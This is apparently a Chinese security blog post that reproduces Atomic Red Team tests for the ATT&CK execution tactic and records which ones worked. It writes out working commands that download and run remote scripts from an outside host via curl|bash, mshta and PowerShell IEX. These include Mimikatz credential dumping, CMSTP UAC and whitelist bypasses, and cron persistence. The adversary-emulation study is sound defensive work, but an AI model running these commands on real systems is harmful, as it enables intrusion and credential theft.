---
layout: post
title: 跟着ATT&CK学安全之execution
excerpt: "跟着ATT&CK学安全之execution"
categories: [ATT&CK]
comments: true
---
#### T1191 - CMSTP
Microsoft Connection Manager Profile Installer (CMSTP.exe)是一个安装连接管理配置的应用程序.它允许接受一个INF文件作为参数,安装一个服务,来进行远程连接.红队可用CMSTP.exe和inf文件来生成恶意命令.CMSTP.exe现在拒绝从远程加载dll,但由于CMSTP.exe是一个合法的程序,且有微软的签名,这个运行仍然可以绕过基于白名单和AppLocker的防御.

CMSTP.exe也可以通过COM接口绕过UAC来执行二进制文件

关于用户账户控制(UAC):UAC 会阻止未经授权应用程序的自动安装，防止无意中对系统设置进行更改。例如选择总是通知将会:
- 当程序试图安装软件或对电脑做出更改时通知你。
- 当你对 Windows 设置进行更改时通知你。
- 冻结其他任务，直到你做出响应。
##### 测试1 CMSTP 运行远程脚本
平台:Windows.运行方式如下`cmstp.exe /s T1191.inf`

window10运行成功
##### 测试2 CMSTP运行绕过UAC
红队可通过向inf文件中植入RunPreSetupCommandsSection来调用cmd.exe,来绕过UAC
```bash
cmstp.exe /s T1191_uacbypass.inf /au
```
window10运行成功
#### T1059 - Command-Line Interface
这个没什么好说的,就是一个命令行运行文件

平台:Linux,运行如下命令
```bash
bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
或者
bash -c "wget --quiet -O - http://snappyzz.com/echo-art-fish.sh | bash"
```
centos上运行成功


#### T1173 - Dynamic Data Exchange
关于动态数据交换（DDE, Dynamic Data Exchange）:DDE是一种动态数据交换机制（Dynamic Data Exchange，DDE）。使用DDE通讯需要两个Windows应用程序，其中一个作为服务器处理信息，另外一个作为客户机从服务器获得信息。客户机应用程序向当前所激活的服务器应用程序发送一条消息请求信息，服务器应用程序根据该信息作出应答，从而实现两个程序之间的数据交换。红队可用DDE来运行二进制命令,微软的文档可以用来放入DDE命令

新建一个Word文档，通过Ctrl+F9添加一个域，然后修改域代码为：
```bash
DDEAUTO c:\windows\system32\cmd.exe "/k calc.exe" 
```
这个并没有复现成功
#### T1118 - InstallUtil
这个就是一个安装和卸载的组件
这个没有复现成功
##### 测试1 InstallUtil uninstall method call
#### T1170 - Mshta
Mshta.exe是用来运行Microsoft HTML Applications (HTA)的.HTA是一个独立的应用,使用的和浏览器同样的技术,但是独立与浏览器.红队和用它来运行Javascript 或者VBScript.它可以用来绕过白名单的防护,也可以绕过浏览器安全防护
##### 测试1 Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
```bash
mshta.exe javascript:a=(GetObject("script:http://snappyzz.com/mshta.sct")).Exec();close();
```
windows10上运行成功
##### 测试2 Mshta calls a local VBScript file to launch notepad.exe
```bash
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""C:\Windows\SysWOW64\calc.exe"")(window.close)")
```
windows10上运行成功
##### 测试3 Mshta executes VBScript to execute malicious command
运行本地的VB脚本通过powershell枚举用户
```bash
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file D:\pycharmproject\atomic-red-team-master\atomics\T1170\src\powershell.ps1"":close")
```
windows10上运行成功
##### 测试4 Mshta Executes Remote HTML Application (HTA)
```bash
mshta.exe http://snappyzz.com/T1170.hta
```
windows10上运行成功
#### T1086 - PowerShell
##### 测试1 下载Mimikatz并dump credentials
```bash
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('http://snappyzz.com/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```
windows10上运行成功
##### 测试2 
下载Bloodhound并运行
```bash
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('http://snappyzz.com/SharpHound.ps1'); Invoke-BloodHound"
```
被win10防病毒拦下
未完待续

#### T1064 - Scripting
这个太简单了把
##### 测试1 在linux上运行脚本
```
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"
chmod +x /tmp/art.sh
sh /tmp/art.sh
```
windows10上运行成功
##### 测试2 在windows上运行脚本
```
C:\Windows\system32\cmd.exe /Q /c echo #{command_to_execute} > #{script_to_create}
C:\Windows\system32\cmd.exe /Q /c #{script_to_create}
```
清除
```
del #{script_to_create}
```
windows10上运行成功
#### T1216 - Signed Script Proxy Execution
带有证书的脚本可以用来执行恶意文件
这个也未完待续
### T1154 - Trap
Trap命令允许程序和shell在收到interrupt命令后执行特定的命令.一种常见的情况是脚本允许终止和处理常见的键盘中断，如`ctrl+c`和`ctrl+d`,攻击者可以利用这点来注册代码,当shell被打断的时候运行.trap的格式是`trap 'command list' signals` 这表示程序收到signals时运行command list.
###### 测试1 Trap
```
trap "nohup $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash" SIGINt
```
成功复现
### T1151 - Space after Filename
红队可以修改文件的扩展名来迷惑蓝队.在macOS系统上,如果一个程序命名为"evil.txt ",由于最后的空格,双击它之后,它将作为二进制文件被运行

平台:macOS
```
1. echo '#!/bin/bash\necho "print "hello, world!"" | /usr/bin/python\nexit' > execute.txt && chmod +x execute.txt

2. mv execute.txt "execute.txt "

3. ./execute.txt\

```
### T1153 - Source
`source`命令可以在当前的shell中加载函数或在当前的目录下运行文件.命令类似`source /path/to/filename [arguments]`或者`. /path/to/filename [arguments]`.注意那个`.`后的空格,如果没有那个空格,程序就不会在当前目录下运行.这通常用来使某个shell可以使用某些特性或功能，或者更新特定的shell环境。

红队可以使用这个技术来运行文件,且运行的文件不需要被标记为可执行文件.
###### 测试1 Execute Script using Source
```
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
source /tmp/art.sh
```
成功复现
###### 测试2 Execute Script using Source Alias
```
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
. /tmp/art.sh
```
成功复现
### T1168 - Local Job Scheduling
对于cron:通过修改`/etc/crontab`文件和`/etc/cron.d/`文件夹或其他支持cron的位置来创建cron jobs

对于at:也可以调度程序和script在xx时间之后.

对于launchd:只在macOS上可以实现,暂时跳过
###### 测试1 Cron - Replace crontab with referenced file
```
echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
例如
echo "* * * * * /tmp/evil.sh" > /tmp/persistevil && crontab /tmp/persistevil
```
成功复现
###### 测试2 Cron - Add script to cron folder
```
echo "#{command}" > /etc/cron.daily/#{cron_script_name}
```
成功复现